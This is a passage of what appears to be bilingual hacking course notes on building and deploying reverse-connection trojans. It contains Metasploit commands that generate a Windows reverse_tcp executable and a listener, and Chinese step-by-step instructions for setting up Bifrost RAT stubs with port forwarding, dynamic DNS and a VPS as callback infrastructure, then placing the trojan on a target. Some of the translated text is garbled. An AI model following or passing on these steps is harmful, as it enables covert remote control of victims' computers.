    msf> search payloads\nmsf> use payload/windows/reverse_tcp\nmsf> set LHOST 192.168.52.130\n\
    msf> set LPORT 4444\nmsf> generate -f -t exe\n```\nIt will create `server.exe`\
    \ in the root.\n\n```bash\nmsf> use exploit/multi/handler\nmsf> set payload windows/reverse_tcp\n\
    msf> set LHOST 192.168.52.130\nmsf> set LPORT 4444\nmsf> exploit -j\n```\n```bash\n\
    msf> sessions -l\nmsf> sessions -i 2\n```\nYou can do anything in machine.\n"
  trans: "\n\n![](img/image-14tobn8j.jpg) 后门是指通过它我们可以访问机器并绕过现有安全策略的后门。微软拥有允许其对机器进行远程访问的后门。\n\
    \n### b) 特洛马\n![](img/image-3cly34nc.jpg)\n\n木马是一个携带了恶意程序的良好程序。当客户端下载良好程序时，它会同时下载木马程序，这样黑客就可以访问该机器。\n\
    \n### c) 显性通道与隐蔽通道\n![](img/image-smaxbz3a.jpg) 显性通道意味着任何程序运行时都会在其与系统之间建立通道。隐蔽通道则意味着程序将以错误的方向使用通道来访问机器。\n\
    \n### d) 不同类型的木马\n![](img/image-j081gv47.jpg) \n\n### e) 反向连接木马是如何工作的 \n黑客电脑上的木马程序会创建一个创建一个安装在客户端电脑上的服务器。在反向连接技术中，客户端电脑上的服务器将连接到黑客机器上的木马程序。我们面临的问题是黑客需要一个持续的真实\
    \ IP，而 Windows Trojans ![](img/image-6ddu6tjw.jpg) 工具有 `Bifrost` 和 `Poison Ivy`。我们必须进行端口转发和动态\
    \ DNS。回到基础，然后在路由器配置网站中进行 NAT。选择起始结束端口号以及黑客电脑的内部 IP。我们需要将黑客电脑的 IP 设为静态，并与路由器配置中的\
    \ IP 一致。这意味着如果路由器通过端口 `81` 访问真实 IP，它必须将其转发到内部 IP 为 `192.168.1.150` 端口为 `81` 的黑客电脑。\n\
    \n问题是路由器的真实 IP 不是固定的会变化。解决方案是购买真实 IP。要购买真实 IP，我们需要为黑客注册电话线路。因此更好的解决方案是在动态 DNS\
    \ 服务器上注册动态域名。该域名将指向路由器的真实 IP。如果真实 IP 变化，路由器将更改动态 DNS 服务器中的数据。客户端木马将与动态 DNS 服务器连接，并告诉它路由器的真实\
    \ IP。因此木马通过木马程序中指定的端口连接到路由器，路由器会将端口转发到黑客电脑 ![](img/image-gtyyrulj.jpg)\n\n`no-ip.com`\
    \ 网站可以提供动态 DNS。注册，然后选择添加主机。在黑客电脑上下载并设置 `no-ip` 程序 ![](img/image-pf5tzvq7.jpg)\
    \ ![](img/image-xug38814.jpg) 你可以利用路由器中称为动态 dns 的属性 ![](img/image-7yeudsd3.jpg)\
    \ 在 `dyndns.com` 注册账户并将注册信息放入路由器配置中。当路由器重启时，它将在动态 DNS 中注册其 IP。我们可以使用 VPS 机器。VPS\
    \ 将拥有真实 IP，它是直接连接到互联网的设备，我们通过它运行木马程序。客户端木马服务器将对此真实 IP 进行反向连接，这样真实 IP 就不会改变，且 VPS\
    \ 24 小时在线。\n\n### f) Windows 木马工具\n![](img/image-noesx35r.jpg) 下载 `bifrost`。`bifrost`\
    \ 体积小且接受多种加密方式。进行注册。在路由器上进行端口转发 ![](img/image-c2xwnpjv.jpg) 然后进入 `bifrost stub\
    \ customizer` 并按照以下设置生成木马。生成的文件将是 `Customized`.image-5ydz648w.jpg) 打开程序 `bifrost`。输入动态\
    \ dns 名称和木马程序运行所需的端口号 ![](img/image-k4neueqa.jpg) ![](img/image-e8c2wgdf.jpg)\
    \ 我们将自定义文件放在想要操作的机器上。\n\n"
